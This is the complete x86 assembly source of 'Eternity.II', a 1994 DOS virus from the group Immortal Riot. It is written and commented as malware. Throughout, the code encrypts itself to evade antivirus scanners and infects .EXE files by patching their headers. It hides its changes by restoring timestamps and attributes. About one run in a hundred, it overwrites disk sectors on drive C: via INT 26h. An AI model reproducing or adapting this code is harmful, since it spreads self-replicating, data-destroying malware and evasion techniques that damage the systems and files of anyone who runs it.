;		         -Eternity.II-
;      "Created by Immortal Riot's destructive development team"
;              (c) '94 The Unforgiven/Immortal Riot 
;
;       "If this virus survive into eternity, I'll live forever"
;			       or
;	              "Nothing last forever"
;
; Notes:
;  F-Prot, Scan, TBAV, Findviru, can't find shits of this virus.
;
; Disclaimer:
;  If this virus harms your computer and you kill yourself,
;  I'll not attend on nor pay for your funeral. 
;
; Dedication:
;  I dedicate this virus to all members of Dia Psalma for all
;  the ideoligical inspiration I've gained from listening on
;  their music as well as talking with them.

		.model	tiny
		.radix	16
		.code

Virus_Lenght	EQU	Virus_End-Virus_Start
		org	100

Virus_Start:
xchg ax, ax				    ; A nop to fill out the virus
mov ax,0fa01h				    ; to be exactly 600 bytes!
mov dx,5945h
int 16h

call	Get_delta			    ; Get the delta-offset!
Get_delta:
pop bp
sub bp,Get_Delta-Virus_Start

call encrypt_decrypt			    ; Decrypt the virus
jmp short encryption_start		    ; then continue..

write_virus:				    
call encrypt_decrypt			    ; Encrypt the virus
mov  ah,40	
mov  cx,Virus_Lenght
mov  dx,bp
int  21
call encrypt_decrypt			    ; Decrypt it again
ret

encryption_value dw 0
encrypt_decrypt:
lea si,cs:[bp+encryption_start-virus_start]
mov cx,(end_of_virus-encryption_start+1)/2
mov dx,word ptr cs:[bp+encryption_value-virus_start]

Xor_LoopY:
xor word ptr cs:[si],dx
inc si
inc si
loop Xor_LoopY
ret

encryption_start:			    ; Heuristic, beat this!
mov     ax,es
add	ax,10
add	ax,cs:[bp+Exe_header-Virus_Start+16]
push	ax
push	cs:[bp+Exe_header-Virus_Start+14]

push	ds
push	cs
pop	ds

mov	ah,1a				    ; Set the DTA
lea     dx,[bp+Own_dta-virus_start]
int	21

One_Percent:
mov ah,2ch				    ; 1%
int 21h
cmp dl,0
jne get_drive

Cruel:					    ; God what I hate that
mov al,2h				    ; eskimoe!
mov cx,1
lea bx,v_name
cwd
int 26h 

Get_drive:				    ; Current drive
mov ah,19h
int 21h
cmp al,2				    ; A: or B:?
jae get_dir
jmp restore_dir				    ; Yep, then don't infect 
					    ; other files that run!
Get_Dir:
mov ah,47
xor dl,dl
lea si,[bp+dir-virus_start]
int 21

Di_Counter:
xor di,di				    ; Infection counter=0
                                            ; will be inc after each infection!

_4EH:
mov	ah,4e				    ; Bummer..

Loop_Files:
lea     dx,[bp+file_match-virus_start]
int	21

jnc	clear_attribs			    ; We did find a file!
					    ; Happy Happy, joy joy!
Dot_Dott:
lea dx,[bp+dot_dot-virus_start]		    ; Ah, the same old
mov ah,3bh				    ; dot-dot-routine again!
int 21h

jnc not_root				   ; No error!
jmp no_victim_found			   ; No more files in ..

not_root:
mov ah,4e				   ; Find first file
jmp short Loop_Files			   ; in the new directory

Clear_attribs:				   ; Clear file-attrib
mov ax,4301h
xor cx,cx
lea dx,[bp+own_dta-virus_start+1eh]	   ; 1eh=filename in DTA-aera
int 21h

Open_File:
mov ax,3d02			           ; Open file in read/write mode
mov dx,Own_dta-Virus_Start+1e		   ; Yep, it's still 1eh in DTA!
add dx,bp				   ; bummer!
int 21

jnc read_File			           ; No error, then read the file!
jmp cant_open_file			   ; Hrm?!

v_name 	db "Eternity_II"             	   ; Virus name!


Read_File:
xchg ax,bx		                   ;File handle in bx

mov ah,3f		                   ;Read file - 28 bytes
mov cx,1c		                   ;to EXE_header (1ch)
lea dx,[bp+exe_header-virus_start]
int 21

jnc no_error	                           ; It worked (duh)
jmp read_error				   ; Hrm?!

no_error:
cmp byte ptr ds:[bp+Exe_header-Virus_Start],'M'
jnz no_exe	
cmp word ptr ds:[bp+Exe_header-Virus_Start+12],'RI'
jz  infected

mov  al,2				    ; File pointer
call F_Ptr				    ; to end of file

push dx
push ax

Random:
mov ah,2ch 				    ; Yah. Nearly polymorfic?
int 21h				            ; Oh well :-). 
add dl,dh
jz  random
mov word ptr cs:[bp+encryption_value-virus_start],dx   

call write_virus			   ; Write encrypted copy

mov  al,2				   ; File pointer to end of file
Call F_Ptr

mov cx,200				   ; bummer..
div cx
inc ax
mov word ptr ds:[Exe_header-Virus_Start+2+bp],dx
mov word ptr ds:[Exe_header-Virus_Start+4+bp],ax

pop ax
pop dx

mov cx,10
div cx
sub ax,word ptr ds:[Exe_header-Virus_Start+8+bp]
mov word ptr ds:[Exe_header-Virus_Start+16+bp],ax
mov word ptr ds:[Exe_header-Virus_Start+14+bp],dx
mov word ptr ds:[Exe_header-Virus_Start+12+bp],'RI'

mov  al,0				    ; File pointer to top of file
call F_Ptr

mov ah,40		                    ; Write header
mov cx,1c
lea dx,[bp+exe_header-virus_start]
int 21

jc write_error				    ; Hrm!?

no_exe:
jmp short Restore_Time_Date

infected:				    ; Decrease infection counter
dec di					    ; with one

Restore_Time_Date:			    ; Nearly stealth?
lea si,[bp+own_dta-virus_start+16h]	    ; Oh well :-).
mov cx,word ptr [si]
mov dx,word ptr [si+2]
mov ax,5701h
int 21h

Close_File:				    ; Close the file
mov ah,3e	
int 21

Set_Back_Attribs:			    ; Stealth-bomber!
mov ax,4301h
xor ch,ch
lea bx,[bp+own_dta-virus_start+15h]
mov cl,[bx]
lea dx,[bp+own_dta-virus_start+1eh]
int 21h

Sick_or_EXE:
mov ah,4f				    ; 4fh=find next file
inc di
cmp di,3				    ; Infected three files?
jae finnished_infection			    ; Yep!
jmp Loop_Files				    ; Nah!

F_Ptr:					    ; Since we're using
mov ah,42				    ; this routine
xor cx,cx				    ; three times,
cwd					    ; calling this
int 21				            ; will save us
ret					    ; some bytes

write_error:				    ; For no use in this virus,
read_error:				    ; but if something screws
cant_open_file:		                    ; up, add 09/i21h functions,  
no_victim_found:	                    ; and test what didn't work.      
finnished_infection:			    ;

Restore_Dir:				    ; More stealth..
lea dx,[bp+dir-virus_start]
mov ah,3bh
int 21

quit:					    ; Return to original program
pop	ds
retf

groupdb db "(c) '94 The Unforgiven/Immortal Riot" ; That's moi..

dot_dot		db	'..',0		    ; Another directory
file_match	db	'*.EXE',0	    ; Infect ‚m all!

Exe_header	db	16 DUP(0)
		dw	0fff0	
		db	4  DUP(0)
Own_Dta		db	02bh DUP(0)
dir		db 65 dup (?)		    ; Really really stupid!

Virus_End	EQU	$
end_of_virus:
		end	Virus_Start